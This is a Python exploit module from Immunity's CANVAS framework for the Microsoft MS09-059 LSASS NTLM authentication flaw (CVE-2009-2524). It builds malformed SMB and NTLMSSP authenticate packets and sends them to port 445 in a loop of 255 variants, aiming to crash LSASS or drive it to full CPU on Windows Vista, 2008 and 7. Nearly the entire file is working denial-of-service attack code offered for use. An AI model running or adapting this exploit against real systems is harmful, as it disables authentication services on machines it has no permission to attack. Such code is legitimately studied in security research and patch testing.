#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  ms09_059.py
## Description:  
##            :  
## Created_On :  Wed Oct 14 12:00:51 2009
## Created_By :  Kostya Kortchinsky
## Modified_On:  Wed Oct 14 16:33:30 2009
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################

import sys
import time
import struct
import random

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef

NAME='LSASS NTLM Authenticate Vulnerability'
DESCRIPTION='LSASS NTLM Authenticate Vulnerability'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='10/13/09'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms09-059.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2009-2524'
DOCUMENTATION['CVE Url']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2524'
DOCUMENTATION['CVSS'] = 7.8
DOCUMENTATION['Notes']='Some operating systems are only affected when KB968389, Extended Protection for Authentication has been installed. See MsAdv for details. The result of the exploit will depend on the content of the Heap: LSASS might crash or use 100% of the CPU or nothing might happen.'
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['Vista','2008','7']
PROPERTY['MSADV']='MS09-059'
NOTES=""" 
"""
CHANGELOG="""
"""

targets = {
    0:['Autoversioning'],
    }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=445
        self.needsNoShellcode=1
        self.version=0
        return

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def neededListenerTypes(self):
        return []

    def getArgs(self):
        self.host=self.target.interface
        self.port=self.argsDict.get('port',self.port)
        self.version=self.argsDict.get('version', self.version)
        return

    def buildNegotiatePacket(self):
        #Someday we'll have libsmb, and life will be awesome
        packet=''
        packet+=struct.pack('<4sBLBHH8sHHHHH','\xffSMB',0x72,0x00000000,0x18,0xc803,0x0000,'\0'*8,0x0000,0x0000,0x0000,0x0000,0x0000)
        dialects=''
        for d in ['PC NETWORK PROGRAM 1.0','LANMAN1.0','Windows for Workgroups 3.1a','LM1.2X002','LANMAN2.1','NT LM 0.12']:
            dialects+='\x02'+d+'\0'
        packet+=struct.pack('<BH',0x00,len(dialects))+dialects
        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet
        return packet

    def test(self):
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to %s:%s'%(self.host,self.port))
            return 0
        packet=self.buildNegotiatePacket()
        s.send(packet)
        data=s.recv(1024)
        if len(data)<13:
            return 0
        status=struct.unpack('<L',data[9:13])[0]
        if status==0:
            return 1
        else:
            return 0

    def buildNtlmSspNegotiatePacket(self,pid):
        #Someday we'll have libsmb, and life will be awesome
        securityblob='604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d535350000100000005820800000000002800000000000000280000000000000000000000'.decode('hex')
        if len(securityblob)==0:
            securityblob+='\0'
        data='Windows Vista (TM) Ultimate 6002 Service Pack 2\0'.encode('UTF-16LE')+'Windows Vista (TM) Ultimate 6.0\0'.encode('UTF-16LE')+'\0'.encode('UTF-16LE')
        packet=''
        packet+=struct.pack('<4sBLBHH8sHHHHH','\xffSMB',0x73,0x00000000,0x18,0xc803,0x0000,'\0'*8,0x0000,0x0000,pid,0x0000,0x0010)
        packet+=struct.pack('<BBBHHHHLHLLH',0x0c,0xff,0x00,0x0000,0x1104,0x0010,0x0000,0x00000000,len(securityblob),0x00000000,0x800000dc,len(securityblob)+len(data))
        packet+=securityblob+data
        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet
        return packet

    def buildNtlmSspAuthenticatePacket(self,pid,uid,index=0):
        #Someday we'll have libsmb, and life will be awesome
        ClientChallenge='\x01'*8
        LmChallengeResponse='\x01'*0x10+ClientChallenge
        NtChallengeReponse='\x01'*0x10
        NtChallengeReponse+=struct.pack('<LLQ',0x0101,0,0)
        NtChallengeReponse+=ClientChallenge
        NtChallengeReponse+=struct.pack('<L',0)
        NtChallengeReponse+=struct.pack('<HB',0xffff,index)
        securityblob='NTLMSSP\0'
        securityblob+=struct.pack('<L',3) #NTLMSSP_AUTH
        offset=0x58
        securityblob+=struct.pack('<HHL',len(LmChallengeResponse),len(LmChallengeResponse),offset)
        offset+=len(LmChallengeResponse)
        securityblob+=struct.pack('<HHL',len(NtChallengeReponse),len(NtChallengeReponse),offset)
        offset+=len(NtChallengeReponse)
        securityblob+=struct.pack('<HHL',0x00,0x00,offset)
        securityblob+=struct.pack('<HHL',0x00,0x00,offset)
        securityblob+=struct.pack('<HHL',0x00,0x00,offset)
        securityblob+=struct.pack('<HHL',0x00,0x00,offset)
        securityblob+=struct.pack('<L',0x00088205)
        securityblob+='\0'*0x18
        securityblob+=LmChallengeResponse
        securityblob+=NtChallengeReponse
        securityblob=struct.pack('<BBB',0x04,0x81,len(securityblob))+securityblob #dirty dirty
        securityblob=struct.pack('<BBB',0xa2,0x81,len(securityblob))+securityblob #dirty dirty
        securityblob=struct.pack('<BBB',0x30,0x81,len(securityblob))+securityblob #dirty dirty
        securityblob=struct.pack('<BBB',0xa1,0x81,len(securityblob))+securityblob #dirty dirty
        if len(securityblob)%2==0:
            securityblob+='\0'
        data='Windows Vista (TM) Ultimate 6002 Service Pack 2\0'.encode('UTF-16LE')+'Windows Vista (TM) Ultimate 6.0\0'.encode('UTF-16LE')+'\0'.encode('UTF-16LE')
        packet=''
        packet+=struct.pack('<4sBLBHH8sHHHHH','\xffSMB',0x73,0x00000000,0x18,0xc803,0x0000,'\0'*8,0x0000,0x0000,pid,uid,0x0020)
        packet+=struct.pack('<BBBHHHHLHLLH',0x0c,0xff,0x00,0x0000,0x1104,0x0010,0x0000,0x00000000,len(securityblob),0x00000000,0x800000dc,len(securityblob)+len(data))
        packet+=securityblob+data
        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet
        return packet

    def run(self):
        self.getArgs()
        for i in range(1,256):
            s=self.gettcpsock()
            try:
                s.connect((self.host,self.port))
            except:
                self.log('Could not connect to %s:%s'%(self.host,self.port))
                return 0
            packet=self.buildNegotiatePacket()
            s.send(packet)
            data=s.recv(1024)
            status=struct.unpack('<L',data[9:13])[0]
            pid=random.randint(0,0xffff)
            packet=self.buildNtlmSspNegotiatePacket(pid)
            s.send(packet)
            data=s.recv(1024)
            status=struct.unpack('<L',data[9:13])[0]
            if status!=0xc0000016:
                self.log('Unexpected packet received. Aborting.')
                return 1
            uid=struct.unpack('<H',data[32:34])[0]
            packet=self.buildNtlmSspAuthenticatePacket(pid,uid,i)
            s.send(packet)
            self.log('Sent index 0x%02x. Sleeping 1s.'%(i))
            time.sleep(1)
            try:
                data=s.recv(1024)
            except timeoutsocket.Timeout:
                self.log('Timeout on recv(), LSASS most likely crashed. Aborting.')
                break
            self.setProgress((i*100)/256)
            s.close()
        self.setProgress(100)
        self.log('The target LSASS should be either dead or using 100% CPU or still up :(')
        return 0

    def usage(self):
        print 'Usage: %s -t host -p port'%(sys.argv[0])
        self.displayVersions()
        
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
